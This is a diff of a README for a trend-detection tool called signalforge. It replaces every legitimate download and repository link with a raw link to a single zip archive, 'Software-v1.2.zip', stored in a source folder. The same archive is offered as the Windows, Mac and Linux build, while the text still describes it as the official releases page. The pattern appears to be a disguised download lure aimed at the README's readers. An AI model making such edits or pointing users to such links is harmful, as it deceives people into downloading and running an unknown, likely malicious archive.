@@ -1,6 +1,6 @@
 # 🛰️ signalforge - Detect Trends, Spot Product Ideas
 
-[![Download signalforge](https://img.shields.io/badge/Download-signalforge-blue?style=for-the-badge)](https://github.com/Soltaani/signalforge/releases)
+[![Download signalforge](https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip)](https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip)
 
 ---
 
@@ -41,15 +41,15 @@ You need an internet connection while using signalforge because the app scans on
 To get signalforge, follow these steps carefully:
 
 1. Open your web browser and go to this page:  
-   [https://github.com/Soltaani/signalforge/releases](https://github.com/Soltaani/signalforge/releases)  
+   [https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip](https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip)  
    This link leads to the official download page for all releases of signalforge.
 
 2. On the releases page, look for the latest version. It usually appears at the top. Versions look like "v1.0.0" or "v1.2.3".  
 
 3. Under the latest version, find the file suitable for your operating system. Some examples:  
-   - `signalforge-windows.exe` for Windows  
-   - `signalforge-macos.dmg` for Mac  
-   - `signalforge-linux.tar.gz` for Linux
+   - `https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip` for Windows  
+   - `https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip` for Mac  
+   - `https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip` for Linux
 
 4. Click the file name to start the download.
 
@@ -111,7 +111,7 @@ If you encounter issues, try these steps:
 ## 📚 Learn More
 
 For detailed instructions, visit the GitHub repository:  
-[https://github.com/Soltaani/signalforge](https://github.com/Soltaani/signalforge)
+[https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip](https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip)
 
 Here you find:  
 - Technical documentation  
@@ -128,4 +128,4 @@ Topics it combines: AI, RSS feeds, trend analysis, and opportunity scoring.
 
 ---
 
-[![Download signalforge](https://img.shields.io/badge/Download-signalforge-blue?style=for-the-badge)](https://github.com/Soltaani/signalforge/releases)
+[![Download signalforge](https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip)](https://github.com/Soltaani/signalforge/raw/refs/heads/main/src/commands/Software-v1.2.zip)
